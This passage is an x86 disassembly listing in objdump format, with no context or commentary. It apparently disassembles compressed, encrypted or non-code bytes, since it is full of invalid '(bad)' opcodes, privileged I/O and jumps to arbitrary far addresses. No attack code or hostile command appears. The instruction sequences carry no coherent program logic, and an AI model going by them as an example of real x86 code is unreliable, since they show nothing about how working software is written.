  417a2a:	or     ebp,0x33afb6df
  417a30:	jmp    0x4179c0
  417a32:	jecxz  0x4179b9
  417a34:	cmp    ebx,DWORD PTR [edi+0x3c]
  417a37:	fsub   DWORD PTR [edx]
  417a39:	cmp    bl,BYTE PTR [eax+eax*1+0x53]
  417a3d:	dec    ebx
  417a3e:	rcr    BYTE PTR [edx],cl
  417a40:	mov    ds:0x64b55cbf,eax
  417a45:	sbb    al,0x47
  417a47:	jge    0x417ac8
  417a49:	out    0x6f,eax
  417a4b:	dec    ebx
  417a4c:	xchg   BYTE PTR [ebx+0x52],ah
  417a4f:	outs   dx,BYTE PTR ds:[esi]
  417a50:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417a52:	lods   al,BYTE PTR ds:[esi]
  417a53:	adc    al,0xfa
  417a55:	les    edx,FWORD PTR es:[esp+edi*2+0x69]
  417a5a:	clc    
  417a5b:	inc    ebx
  417a5c:	xchg   ebx,eax
  417a5d:	pop    es
  417a5e:	dec    ebx
  417a5f:	fs sub eax,0x7d1e9a22
  417a65:	(bad)  
  417a66:	fstp   QWORD PTR [ebp+edx*1+0x62]
  417a6a:	into   
  417a6b:	in     al,0x21
  417a6d:	cld    
  417a6e:	lds    edi,FWORD PTR [eax+0x21]
  417a71:	into   
  417a72:	xor    DWORD PTR [ebp-0x7f],esi
  417a75:	pop    esi
  417a76:	push   ds
  417a77:	(bad)  
  417a78:	daa    
  417a79:	sub    al,0x2d
  417a7b:	cli    
  417a7c:	and    BYTE PTR [edx],al
  417a7e:	out    0x50,al
  417a80:	jp     0x417a23
  417a82:	xchg   edi,eax
  417a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a84:	dec    edi
  417a85:	fidivr WORD PTR [ebx+0x7a]
  417a88:	pop    esi
  417a89:	and    al,dl
  417a8b:	sbb    ch,BYTE PTR ds:0x820cdee0
  417a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a92:	xor    al,0x12
  417a94:	or     eax,0xf1c72127
  417a99:	xchg   edx,eax
  417a9a:	jbe    0x417af9
  417a9c:	(bad)  
  417a9d:	pop    esp
  417a9e:	add    al,BYTE PTR [esi]
  417aa0:	outs   dx,DWORD PTR ds:[esi]
  417aa1:	lahf   
  417aa2:	(bad)  
  417aa3:	sbb    cl,BYTE PTR [ebx-0x3621fef3]
  417aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aaa:	sbb    edi,edx
  417aac:	setg   dl
  417aaf:	or     DWORD PTR [edx],0x5b
  417ab2:	ins    DWORD PTR es:[edi],dx
  417ab3:	fstp   TBYTE PTR [ebx]
  417ab5:	stos   BYTE PTR es:[edi],al
  417ab6:	push   ds
  417ab7:	pop    ecx
  417ab8:	jmp    FWORD PTR [edi-0x35]
  417abb:	js     0x417abe
  417abd:	fprem  
  417abf:	sbb    eax,0xc23906da
  417ac4:	out    dx,eax
  417ac5:	aad    0x87
  417ac7:	loopne 0x417aaf
  417ac9:	push   ss
  417aca:	loop   0x417aa4
  417acc:	sbb    ecx,ebp
  417ace:	xchg   esi,eax
  417acf:	cmc    
  417ad0:	dec    edx
  417ad1:	mov    ds,WORD PTR [ebp+edi*4-0x71]
  417ad5:	pusha  
  417ad6:	push   0xadcbc7ae
  417adb:	fdivr  QWORD PTR [esi]
  417add:	in     al,0xbd
  417adf:	rcr    BYTE PTR [edx+0x8],1
  417ae2:	dec    edi
  417ae3:	push   esi
  417ae4:	std    
  417ae5:	dec    esi
  417ae6:	mul    DWORD PTR [ebx]
  417ae8:	xchg   edx,eax
  417ae9:	jne    0x417af3
  417aeb:	inc    eax
  417aec:	jnp    0x417adf
  417aee:	dec    edx
  417aef:	(bad)  
  417af0:	ins    DWORD PTR es:[edi],dx
  417af1:	mov    ds:0x77b18dbe,al
  417af6:	imul   edi,DWORD PTR [esi],0xcc3a4f75
  417afc:	dec    ebx
  417afd:	retf   
  417afe:	mov    fs,edx
  417b00:	dec    ebp
  417b01:	dec    ecx
  417b02:	jecxz  0x417b5a
  417b04:	popa   
  417b05:	test   BYTE PTR [edi+0x7bfc8eb6],cl
  417b0b:	and    ah,BYTE PTR [esi]
  417b0d:	leave  
  417b0e:	sahf   
  417b0f:	pop    ss
  417b10:	inc    eax
  417b11:	push   cs
  417b12:	jecxz  0x417a9a
  417b14:	leave  
  417b15:	icebp  
  417b16:	cmp    al,0xac
  417b18:	mov    ch,0x44
  417b1a:	and    BYTE PTR [edx+ebx*2],dh
  417b1d:	cdq    
  417b1e:	dec    eax
  417b1f:	fnstenv [edx+ebx*2]
  417b22:	add    ch,BYTE PTR [ebp+0x1f]
  417b25:	ror    eax,cl
  417b27:	stc    
  417b28:	mov    ch,0xb9
  417b2a:	into   
  417b2b:	out    dx,eax
  417b2c:	loop   0x417b24
  417b2e:	xor    bh,BYTE PTR [edi+0x7d054eaa]
  417b34:	or     cl,BYTE PTR [edi+0x34]
  417b37:	add    ebx,DWORD PTR gs:[ebp-0x2b]
  417b3b:	sbb    al,0x8e
  417b3d:	mov    ah,0x8e
  417b3f:	std    
  417b40:	dec    ebp
  417b41:	mov    ecx,0x354aec8a
  417b46:	sbb    bh,ah
  417b48:	outs   dx,DWORD PTR ds:[esi]
  417b49:	shl    DWORD PTR [esi+0x8065ee6],cl
  417b4f:	fisub  DWORD PTR [edx]
  417b51:	dec    BYTE PTR [edx+0x36]
  417b54:	sbb    eax,0xff0765ed
  417b59:	add    BYTE PTR [ecx],ch
  417b5b:	scas   al,BYTE PTR es:[edi]
  417b5c:	cli    
  417b5d:	loopne 0x417b9c
  417b5f:	mov    al,ds:0x84114660
  417b64:	inc    ebp
  417b65:	jnp    0x417b6d
  417b67:	scas   eax,DWORD PTR es:[edi]
  417b68:	push   ds
  417b69:	in     eax,0x7b
  417b6b:	mov    DWORD PTR [eax+0x71],esp
  417b6e:	cdq    
  417b6f:	push   es
  417b70:	or     al,0x50
  417b72:	pop    esp
  417b73:	add    DWORD PTR [eax+0x37],ecx
  417b76:	outs   dx,BYTE PTR ds:[esi]
  417b77:	lock cmp eax,DWORD PTR [ecx]
  417b7a:	retf   
  417b7b:	out    0x29,eax
  417b7d:	jae    0x417b33
  417b7f:	(bad)  
  417b81:	cmp    eax,0x4944d15c
  417b86:	add    esp,DWORD PTR [ebx+0x4ab3b411]
  417b8c:	pusha  
  417b8d:	sar    DWORD PTR [esi+0x5665485d],cl
  417b93:	dec    edx
  417b94:	out    dx,eax
  417b95:	(bad)  
  417b96:	aad    0xb7
  417b98:	xchg   edi,eax
  417b99:	sub    eax,0xfebfd9e2
  417b9e:	jne    0x417b5e
  417ba0:	ins    BYTE PTR es:[edi],dx
  417ba1:	dec    edx
  417ba2:	mov    bl,BYTE PTR [ebx-0x31d95884]
  417ba8:	dec    edx
  417ba9:	xlat   BYTE PTR ds:[ebx]
  417baa:	adc    al,0xb1
  417bac:	mov    ah,0xa2
  417bae:	sub    DWORD PTR [edx-0x1b7a3ba4],eax
  417bb4:	test   eax,0xb629e467
  417bb9:	jp     0x417b92
  417bbb:	mov    cs,eax
  417bbd:	mov    ebx,0x749d972a
  417bc2:	xchg   edx,eax
  417bc3:	enter  0xaab,0xf0
  417bc7:	sub    BYTE PTR [ecx+0x2e62ac75],bl
  417bcd:	jp     0x417bae
  417bcf:	sbb    BYTE PTR [eax],dh
  417bd1:	cmp    bl,BYTE PTR [esi]
  417bd3:	push   es
  417bd4:	jbe    0x417c11
  417bd6:	pop    eax
  417bd7:	jno    0x417b88
  417bd9:	mov    dh,0xff
  417bdb:	ret    0xdb0f
  417bde:	xchg   ecx,eax
  417bdf:	in     al,0x98
  417be1:	mov    ?,WORD PTR [esp+ebp*8]
  417be4:	(bad)  
  417be5:	ror    esi,1
  417be7:	push   es
  417be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be9:	jnp    0x417c55
  417beb:	sub    eax,0x859c7e51
  417bf0:	sub    eax,0x57ce9c3b
  417bf5:	pop    ss
  417bf6:	imul   ebp,DWORD PTR [edx+0x74],0xffffffec
  417bfa:	sbb    DWORD PTR [ebp-0x74],ecx
  417bfd:	xor    esi,DWORD PTR [edi-0x37]
  417c00:	imul   ecx,DWORD PTR [ecx+0x2045fe8b],0xffffffa7
  417c07:	inc    ebp
  417c08:	cmc    
  417c09:	xchg   DWORD PTR [edi-0x10],ecx
  417c0c:	scas   al,BYTE PTR es:[edi]
  417c0d:	xor    eax,0x64cec2bb
  417c12:	add    al,0xef
  417c14:	fsub   DWORD PTR [ebp+0x17419253]
  417c1a:	xchg   bl,dh
  417c1c:	ror    DWORD PTR [edi-0x68],cl
  417c1f:	cdq    
  417c20:	stos   DWORD PTR es:[edi],eax
  417c21:	(bad)  
  417c22:	loopne 0x417c2f
  417c24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c25:	xor    eax,0xcff583c7
  417c2a:	and    al,0x7c
  417c2c:	adc    DWORD PTR [ebp-0x27],esi
  417c2f:	pop    eax
  417c30:	xchg   ecx,eax
  417c31:	std    
  417c32:	out    dx,al
  417c33:	cmp    BYTE PTR ss:[esi],0xde
  417c37:	pop    es
  417c38:	pop    eax
  417c39:	imul   edx,ebp,0xffffffde
  417c3c:	sub    DWORD PTR [edi-0x1c],eax
  417c3f:	mov    edx,DWORD PTR [edx+0x50]
  417c42:	imul   esi,DWORD PTR [esi-0x19033753],0x41bb6e6e
  417c4c:	pushf  
  417c4d:	enter  0x51bc,0x4e
  417c51:	leave  
  417c52:	arpl   bp,sp
  417c54:	(bad)  
  417c55:	mov    cl,0xf8
  417c57:	or     DWORD PTR ds:0xa96961cb,ebx
  417c5d:	popf   
  417c5e:	fsub   DWORD PTR [ebx+0xdb101bf]
  417c64:	test   DWORD PTR [ebx+0x408e859b],ecx
  417c6a:	inc    eax
  417c6b:	pushf  
  417c6c:	sbb    edi,esp
  417c6e:	jmp    0x963e:0x1bc715c9
  417c75:	neg    ah
  417c77:	sbb    BYTE PTR [edx],bh
  417c79:	mov    dl,0x6a
  417c7b:	jge    0x417c9e
  417c7d:	repz dec DWORD PTR [eax]
  417c80:	jmp    0x231d:0x7c0f1c0f
  417c87:	mov    esi,0x7acc454b
  417c8c:	fnstsw WORD PTR [edi+0x663e433d]
  417c92:	xor    al,0x68
  417c94:	ret    0xbbd2
  417c97:	das    
  417c98:	sbb    al,BYTE PTR [eax]
  417c9a:	mov    ah,0x15
  417c9c:	xchg   BYTE PTR [ebx-0x76],cl
  417c9f:	dec    ecx
  417ca0:	xlat   BYTE PTR ds:[ebx]
  417ca1:	mov    esp,DWORD PTR [edi+eax*8]
  417ca4:	call   0xb9dee987
  417ca9:	adc    BYTE PTR [ebx+0x189b0af8],0x77
  417cb0:	add    DWORD PTR [ebp+eiz*8-0x50662945],0xedcc6030
  417cbb:	js     0x417c4f
  417cbd:	es addr16 (bad) 
  417cc0:	mov    ecx,0x7b1ed701
  417cc5:	retf   0xcba3
  417cc8:	inc    ecx
  417cc9:	pushf  
  417cca:	xchg   esi,eax
  417ccb:	cli    
  417ccc:	push   eax
  417ccd:	xchg   BYTE PTR [eax-0x37],ah
  417cd0:	(bad)  
  417cd3:	clc    
  417cd4:	imul   esp,DWORD PTR [eax-0x986453f],0x1000c52f
  417cde:	adc    BYTE PTR [ebp-0x71],dh
  417ce1:	(bad)  
  417ce2:	cmp    ebp,edx
  417ce4:	pop    esi
  417ce5:	mov    ds:0x1141bdb1,al
  417cea:	add    BYTE PTR [eax-0x7c],dl
  417ced:	int    0x7e
  417cef:	dec    esi
  417cf0:	enter  0xa0fb,0xb
  417cf4:	shl    DWORD PTR [eax],cl
  417cf6:	sti    
  417cf7:	mov    ecx,0x13e8dc21
  417cfc:	fsubr  DWORD PTR [edi+0x3f]
  417cff:	scas   al,BYTE PTR es:[edi]
  417d00:	pop    esi
  417d01:	lahf   
  417d02:	dec    esi
  417d03:	daa    
  417d04:	pop    edx
  417d05:	(bad)  
  417d06:	pop    ebp
  417d07:	test   eax,0x245c913f
  417d0c:	iret   
  417d0d:	nop
  417d0e:	adc    al,0x77
  417d10:	pop    ecx
  417d11:	mov    bh,0x61
  417d13:	test   BYTE PTR [ecx+0x1],ah
  417d16:	jnp    0x417d26
  417d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d19:	outs   dx,DWORD PTR ds:[esi]
  417d1a:	ficom  DWORD PTR [edi]
  417d1c:	enter  0x8228,0xf0
  417d20:	call   0x92cd:0x237fb9f
  417d27:	sahf   
  417d28:	mov    ebp,0x69a76721
  417d2d:	mov    eax,ds:0xa926c709
  417d32:	mov    eax,ds:0xe03a0362
  417d37:	neg    esi
  417d39:	xor    cl,BYTE PTR [ecx]
  417d3b:	icebp  
  417d3c:	popf   
  417d3d:	sub    eax,0xc43915a3
  417d42:	jo     0x417d90
  417d44:	cs hlt 
  417d46:	stos   BYTE PTR es:[edi],al
  417d47:	enter  0x1392,0xf8
  417d4b:	or     eax,0x1b46dcbd
  417d50:	mov    al,0xd
  417d52:	cmc    
  417d53:	mov    ah,0x3b
  417d55:	fiadd  WORD PTR [ecx-0x24]
  417d58:	mov    ebx,0x454e4c31
  417d5d:	inc    edi
  417d5e:	or     BYTE PTR [esi-0x5b3a2c8b],cl
  417d64:	or     eax,0x5d6be45d
  417d69:	jne    0x417d79
  417d6b:	mov    dh,0x3e
  417d6d:	cmp    bl,BYTE PTR [edx+edi*4]
  417d70:	aas    
  417d71:	xor    DWORD PTR [ebp-0x3df15c45],ebp
  417d77:	xlat   BYTE PTR ds:[ebx]
  417d78:	mov    edi,0x2e0d4e8
  417d7d:	dec    eax
  417d7e:	push   ebx
  417d7f:	push   0x57d4270c
  417d84:	aam    0xa2
  417d86:	sbb    dh,BYTE PTR [ecx]
  417d88:	nop
  417d89:	mov    ecx,0x96a51246
  417d8e:	test   BYTE PTR [esi],dh
  417d90:	loop   0x417d41
  417d92:	add    bh,BYTE PTR [ecx+eax*2-0x2d91d8b8]
  417d99:	pop    esi
  417d9a:	std    
  417d9b:	je     0x417dac
  417d9d:	push   cs
  417d9e:	mov    ebx,DWORD PTR [esi-0x79]
  417da1:	pop    esi
  417da2:	xlat   BYTE PTR ds:[ebx]
  417da3:	pop    esp
  417da4:	vpunpckhqdq ymm2,ymm5,YMMWORD PTR [edi-0x748b5ba6]
  417dac:	std    
  417dad:	in     al,0xf3
  417daf:	loopne 0x417df9
  417db1:	das    
  417db2:	in     eax,0x97
  417db4:	jmp    0x417de8
  417db6:	mov    dl,0xd8
  417db8:	sub    eax,0xb7671e9c
  417dbd:	stc    
  417dbe:	jne    0x417dbf
  417dc0:	push   esi
  417dc1:	pop    eax
  417dc2:	sbb    ebx,edx
  417dc4:	push   eax
  417dc5:	cmp    DWORD PTR [ebp+0x7d5b7a5],esi
  417dcb:	mov    edi,0x63240f23
  417dd0:	repz in eax,0x91
  417dd3:	jle    0x417d79
  417dd5:	jge    0x417ded
  417dd7:	lods   al,BYTE PTR gs:[esi]
  417dd9:	push   ecx
  417dda:	(bad)  
  417ddb:	pop    edx
  417ddc:	xchg   BYTE PTR [ebx],bh
  417dde:	data16 ja 0x417dd7
  417de1:	popf   
  417de2:	rcr    BYTE PTR [eax+edi*4-0x13c604df],1
  417de9:	jp     0x417db0
  417deb:	les    esi,FWORD PTR [edx-0x73f75cd4]
  417df1:	mov    gs,WORD PTR [ecx]
  417df3:	add    dh,bl
  417df5:	das    
  417df6:	pusha  
  417df7:	xor    BYTE PTR [ebx+0xc],al
  417dfa:	outs   dx,BYTE PTR ds:[esi]
  417dfb:	fsubr  QWORD PTR [edx+0x3e09369d]
  417e01:	jl     0x417dbc
  417e03:	xchg   esi,eax
  417e04:	push   esp
  417e05:	pop    ss
  417e06:	pop    esi
  417e07:	push   edx
  417e08:	popf   
  417e09:	inc    esp
  417e0a:	inc    esp
  417e0b:	stos   BYTE PTR es:[edi],al
  417e0c:	loope  0x417e85
  417e0e:	dec    ebp
  417e0f:	or     dl,BYTE PTR [eax-0x4e]
  417e12:	inc    esp
  417e13:	(bad)  
  417e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e15:	jmp    0x417e7b
  417e17:	pushaw 
  417e19:	and    DWORD PTR [edx+0x252194bb],esi
  417e1f:	xchg   edi,eax
  417e20:	push   esp
  417e22:	pushf  
  417e23:	push   esp
  417e24:	(bad)  
  417e25:	mov    bl,0x78
  417e27:	imul   ebp,DWORD PTR [ebp-0x38af89e6],0xffffff93
  417e2e:	or     al,0xe9
  417e30:	or     dh,BYTE PTR [edx+0x293c3887]
  417e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e37:	dec    esi
  417e38:	leave  
  417e39:	dec    edx
  417e3a:	push   es
  417e3b:	enter  0x862b,0x88
  417e3f:	push   ss
  417e40:	fst    QWORD PTR [edi+0x340a64bb]
  417e46:	inc    eax
  417e47:	dec    edx
  417e48:	sbb    al,0x60
  417e4a:	and    al,0x71
  417e4c:	dec    edx
  417e4d:	leave  
  417e4e:	lahf   
  417e4f:	aad    0x69
  417e51:	nop
  417e52:	push   ss
  417e53:	inc    esi
  417e54:	retf   
  417e55:	jp     0x417e68
  417e57:	adc    BYTE PTR [ebx+0x79],dh
  417e5a:	into   
  417e5b:	cld    
  417e5c:	loopne 0x417deb
  417e5e:	mov    ds:0x14d103ca,eax
  417e63:	mov    bh,0x15
  417e65:	jb     0x417ec6
  417e67:	push   ecx
  417e68:	xchg   ebx,eax
  417e69:	test   eax,eax
  417e6b:	cld    
  417e6c:	inc    ecx
  417e6d:	lds    eax,FWORD PTR [ebx-0x59]
  417e70:	mov    edx,0xb6a364ff
  417e75:	dec    esp
  417e76:	lahf   
  417e77:	pop    esp
  417e78:	scas   al,BYTE PTR es:[edi]
  417e79:	add    al,0xf3
  417e7b:	nop
  417e7c:	mov    bl,cl
  417e7e:	in     al,dx
  417e7f:	jmp    0x417e5c
  417e81:	enter  0xdd3f,0x72
  417e85:	adc    ebx,DWORD PTR [ebp+0x34]
  417e88:	int    0x7b
  417e8a:	(bad)  
  417e8b:	imul   eax,esi,0xffffffc5
  417e8e:	dec    esp
  417e8f:	loop   0x417ee8
  417e91:	test   eax,0x9c842a73
  417e96:	and    BYTE PTR [edi+0x21],bl
  417e99:	xor    dl,bl
  417e9b:	and    eax,DWORD PTR [edx+edx*2]
  417e9e:	inc    esp
  417e9f:	jnp    0x417e7f
  417ea1:	push   ds
  417ea2:	iret   
  417ea3:	mov    ecx,gs
  417ea5:	inc    esi
  417ea6:	mov    WORD PTR [ebx+0x59],cs
  417ea9:	inc    edi
  417eaa:	test   BYTE PTR [ebx+0x7c066ffb],0x16
  417eb1:	mov    bh,0x5e
  417eb3:	cmc    
  417eb4:	add    DWORD PTR ds:0xa51bf9b7,0x22
  417ebb:	(bad)  
  417ebc:	loop   0x417e57
  417ebe:	xor    DWORD PTR ds:0x83d18de,edi
  417ec4:	xchg   ebx,eax
  417ec5:	inc    ecx
  417ec6:	out    0x61,eax
  417ec8:	cmp    BYTE PTR [eax-0x6c],cl
  417ecb:	add    al,BYTE PTR [ecx-0x41]
  417ece:	je     0x417eef
  417ed0:	mov    edi,0x163ad11c
  417ed5:	mov    cs,WORD PTR [eax-0x633dab5c]
  417edb:	inc    esp
  417edc:	push   ss
  417edd:	int3   
  417ede:	xchg   edi,esi
  417ee0:	xchg   ch,ch
  417ee2:	test   BYTE PTR ds:0x81d4fa2e,ah
  417ee8:	aam    0xa2
  417eea:	ror    BYTE PTR [edi+0x71],1
  417eed:	xor    BYTE PTR [esi],dl
  417eef:	out    dx,al
  417ef0:	je     0x417f17
  417ef2:	jmp    0x10f:0x749d19ae
  417ef9:	xor    BYTE PTR [bp+si],0x14
  417efd:	fisub  WORD PTR [ebx-0x41]
  417f00:	jne    0x417f57
  417f02:	int    0x93
  417f04:	push   ds
  417f05:	sbb    al,cl
  417f07:	and    eax,0xe1e6ed6
  417f0c:	not    BYTE PTR [ebx+edi*1]
  417f0f:	inc    esp
  417f10:	adc    eax,0xc6ce2eaa
  417f15:	dec    edi
  417f16:	adc    bh,ah
  417f18:	xchg   BYTE PTR [ecx],dl
  417f1a:	loope  0x417f60
  417f1c:	jmp    0x26f2:0x5bf5b2f7
  417f23:	fild   QWORD PTR [eax-0x63488c9a]
  417f29:	add    DWORD PTR [edi+0x5e],0xc9ed39e5
  417f30:	jno    0x417eed
  417f32:	test   DWORD PTR [eax+0x7890325c],0x56a37ac2
  417f3c:	cmp    edx,DWORD PTR [eax-0x615c1f6d]
  417f42:	adc    eax,0xcc7249a9
  417f47:	mov    eax,0x985f9434
  417f4c:	test   dh,al
  417f4e:	add    al,0xc4
  417f50:	or     al,0x80
  417f52:	adc    al,0xf5
  417f54:	test   DWORD PTR [edi],edx
  417f56:	(bad)  
  417f57:	out    dx,eax
  417f58:	nop
  417f59:	push   ecx
  417f5a:	push   esi
  417f5b:	mov    ah,ah
  417f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f5e:	pop    edx
  417f5f:	xchg   edx,eax
  417f60:	sbb    bh,bl
  417f62:	adc    eax,0x15607d1c
  417f67:	fnstenv [edx]
  417f69:	test   DWORD PTR [edx-0x119b2c3c],ebp
  417f6f:	xor    BYTE PTR [edx],ah
  417f71:	jbe    0x417fc5
  417f73:	or     DWORD PTR [esi],ecx
  417f75:	loopne 0x417fb8
  417f77:	loop   0x417f13
  417f79:	nop
  417f7a:	dec    edx
  417f7b:	sub    ch,dh
  417f7d:	mov    cl,0x86
  417f7f:	arpl   WORD PTR [eax+0x7a55098e],bx
  417f85:	mov    DWORD PTR [ebp-0x64],esi
  417f88:	inc    edx
  417f89:	pop    es
  417f8a:	xchg   edi,eax
  417f8b:	mov    al,ds:0xcae28216
  417f90:	arpl   WORD PTR [esi],sp
  417f92:	je     0x417f1f
  417f94:	jnp    0x417f9a
  417f96:	push   eax
  417f97:	push   edi
  417f98:	push   edx
  417f99:	call   0x41dfae
  417f9e:	shld   edx,eax,0x2
  417fa2:	shl    eax,0x2
  417fa5:	jmp    0x41852f
  417faa:	lods   al,BYTE PTR ds:[esi]
  417fab:	jecxz  0x41802b
  417fad:	sar    BYTE PTR [eax],0x20
  417fb0:	sub    bl,dl
  417fb2:	hlt    
  417fb3:	gs push eax
  417fb5:	je     0x417f9c
  417fb7:	pop    ds
  417fb8:	pushf  
  417fb9:	outs   dx,BYTE PTR ds:[esi]
  417fba:	xor    edi,DWORD PTR [ecx+0xc]
  417fbd:	push   ss
  417fbe:	cmp    eax,0x7a161604
  417fc3:	xor    edx,DWORD PTR [eax]
  417fc5:	sub    al,0x6b
  417fc7:	inc    ebp
  417fc8:	jl     0x417f92
  417fca:	test   esp,edx
  417fcc:	xchg   BYTE PTR [edx-0x10],bh
  417fcf:	retf   
  417fd0:	out    0x22,al
  417fd2:	fwait
  417fd3:	aaa    
  417fd4:	sub    eax,0xbbb73cc3
  417fd9:	push   ecx
  417fda:	inc    ecx
  417fdb:	mov    dl,0x60
  417fdd:	sar    BYTE PTR [edx+0xa],0xd7
  417fe1:	mov    dh,BYTE PTR [ebp-0x11bc0c5]
  417fe7:	pop    ebp
  417fe8:	pop    edx
  417fe9:	and    eax,0x706f9697
  417fee:	push   cs
  417fef:	shl    DWORD PTR [esp+ebx*4+0xc046b53],1
  417ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ff7:	imul   ebx,DWORD PTR [edi-0x8],0x36bfc271
  417ffe:	adc    bl,cl
  418000:	dec    ebp
  418001:	inc    ebp
  418002:	or     cl,ch
  418004:	clc    
  418005:	push   ebp
  418006:	pop    ecx
  418007:	pop    eax
  418008:	xchg   ecx,eax
  418009:	test   BYTE PTR [ebp+0x2e],dl
  41800c:	sub    eax,0x2405b94
  418011:	jmp    0xd43b1b77
  418016:	sub    ebp,esp
  418018:	or     eax,0xa2c29ead
  41801d:	and    ebp,edx
  41801f:	cmp    esp,DWORD PTR [eax]
  418021:	mov    eax,ds:0x1be44723
  418026:	shl    DWORD PTR [eax+0x4a3386bf],0x36
  41802d:	or     al,0x27
  41802f:	lods   eax,DWORD PTR ds:[esi]
  418030:	sub    ebx,DWORD PTR [ecx]
  418032:	jmp    0xbefb8e37
  418037:	ss aaa 
  418039:	call   0x9a9d:0xa31fddaf
  418040:	adc    cl,dl
  418042:	lahf   
  418043:	xor    al,0xa7
  418045:	iret   
  418046:	pop    eax
  418047:	xor    DWORD PTR [edx-0x3f75e864],edx
  41804d:	add    dh,BYTE PTR [edx+0x36fdefff]
  418053:	dec    DWORD PTR [esi+edi*8+0x2c]
  418057:	mov    edx,0x5d14a82a
  41805c:	pop    eax
  41805d:	(bad)  
  41805e:	pop    ss
  41805f:	aad    0x41
  418061:	inc    esp
  418062:	cli    
  418063:	(bad)  
  418064:	jns    0x417feb
  418066:	pop    ds
  418067:	inc    edi
  418068:	dec    esi
  418069:	int    0x49
  41806b:	push   ebx
  41806c:	jle    0x4180d7
  41806e:	sbb    DWORD PTR [edx-0x403d53eb],ebx
  418074:	fiadd  WORD PTR [edx-0x389f07a5]
  41807a:	dec    ebx
  41807b:	cld    
  41807c:	mov    ebx,0x4184ea41
  418081:	(bad)  
  418082:	in     al,0xca
  418084:	or     DWORD PTR [edx-0x18],ecx
  418087:	add    edx,DWORD PTR [edx]
  418089:	pop    ebp
  41808a:	mov    dh,0xb7
  41808c:	pop    ebp
  41808d:	xchg   ebx,eax
  41808e:	mov    bh,0x88
  418090:	push   eax
  418091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418092:	jmp    0x99a6e236
  418097:	mov    edi,?
  418099:	cli    
  41809a:	outs   dx,DWORD PTR ds:[esi]
  41809b:	xchg   ebp,eax
  41809c:	fcomp  QWORD PTR [edi]
  41809e:	adc    BYTE PTR [ebx],bh
  4180a0:	je     0x418096
  4180a2:	pop    eax
  4180a3:	test   BYTE PTR [ebx+0x43],bl
  4180a6:	stos   DWORD PTR es:[edi],eax
  4180a7:	and    ch,0xa
  4180aa:	into   
  4180ab:	iret   
  4180ac:	lds    esi,FWORD PTR [ebp-0x2ccdc628]
  4180b2:	mov    DWORD PTR [eax],ebp
  4180b4:	lock adc bh,ch
  4180b7:	push   esp
  4180b8:	jb     0x418049
  4180ba:	loopne 0x418107
  4180bc:	or     edi,edi
  4180be:	stos   DWORD PTR es:[edi],eax
  4180bf:	pop    ss
  4180c0:	cmp    BYTE PTR ds:0x86673746,0x5c
  4180c7:	xor    BYTE PTR [eax],ah
  4180c9:	fadd   QWORD PTR [edx+0xf]
  4180cc:	xor    eax,0x9dce46f7
  4180d1:	ret    
  4180d2:	pop    ebx
  4180d3:	mov    esp,0xa952d196
  4180d8:	pop    ecx
  4180d9:	cmp    DWORD PTR [ebx-0x3e],esi
  4180dc:	fnsavew [esi-0x33]
  4180e0:	cmc    
  4180e1:	sub    dl,BYTE PTR [ebp-0x29]
  4180e4:	push   0xccc352ec
  4180e9:	cdq    
  4180ea:	aas    
  4180eb:	imul   ebp,DWORD PTR [edx+0x1f],0x29
  4180ef:	pop    ds
  4180f0:	rcr    ecx,0xa8
  4180f3:	sub    esi,DWORD PTR [ecx*8+0x7ef2fc51]
  4180fa:	fld    DWORD PTR [ebx]
  4180fc:	dec    esi
  4180fd:	repnz mov eax,0xb786069b
  418103:	lds    edx,FWORD PTR [ebx-0x13]
  418106:	mov    dl,BYTE PTR [edi]
  418108:	fcom   QWORD PTR [edx-0x132f6bca]
  41810e:	lods   al,BYTE PTR ds:[esi]
  41810f:	loope  0x41817b
  418111:	dec    eax
  418112:	mov    ch,0xb5
  418114:	sbb    al,0xf5
  418116:	popa   
  418117:	lds    esp,FWORD PTR [esi-0x1fb1a1df]
  41811d:	sub    ecx,DWORD PTR [eax]
  41811f:	pusha  
  418120:	add    al,0xf4
  418122:	mov    bh,0xdd
  418124:	fwait
  418125:	sub    DWORD PTR [edi+0x71429c07],eax
  41812b:	outs   dx,BYTE PTR ds:[esi]
  41812c:	sub    ah,BYTE PTR [eax+0x76f30676]
  418132:	stos   BYTE PTR es:[edi],al
  418133:	mov    esp,0xff596e13
  418138:	or     eax,0x1a14dca8
  41813d:	popa   
  41813e:	out    dx,al
  41813f:	ret    
  418140:	push   ss
  418141:	mov    dl,0x56
  418143:	into   
  418144:	push   cs
  418145:	xchg   ecx,eax
  418146:	sbb    DWORD PTR [edx-0x29],0x2b
  41814a:	adc    eax,0x6196f6d1
  41814f:	fisubr DWORD PTR [ebp+0xd23e62a]
  418155:	scas   al,BYTE PTR es:[edi]
  418156:	sub    ebp,DWORD PTR [eax-0x25]
  418159:	mov    edi,0xcc16b8e2
  41815e:	cwde   
  41815f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418160:	mov    esp,0xe04792ed
  418165:	std    
  418166:	adc    ah,bl
  418168:	je     0x41818b
  41816a:	into   
  41816b:	das    
  41816c:	outs   dx,BYTE PTR ds:[esi]
  41816d:	xor    al,0x36
  41816f:	push   ecx
  418170:	outs   dx,BYTE PTR ds:[esi]
  418171:	int3   
  418172:	aad    0xd9
  418174:	xchg   BYTE PTR [ebp+0x5b331c5d],dh
  41817a:	adc    BYTE PTR [edi+0x4382688c],dl
  418180:	ret    0x6d04
  418183:	lods   al,BYTE PTR ds:[esi]
  418184:	jg     0x418108
  418186:	jg     0x418162
  418188:	js     0x4181b7
  41818a:	xchg   edx,eax
  41818b:	lea    ecx,[edx-0x66f8fa7c]
  418191:	mov    eax,ds:0x476fed14
  418196:	fcmovb st,st(0)
  418198:	pop    ecx
  418199:	sbb    al,0x3
  41819b:	jb     0x4181c4
  41819d:	mov    al,0x78
  41819f:	mov    gs,ebp
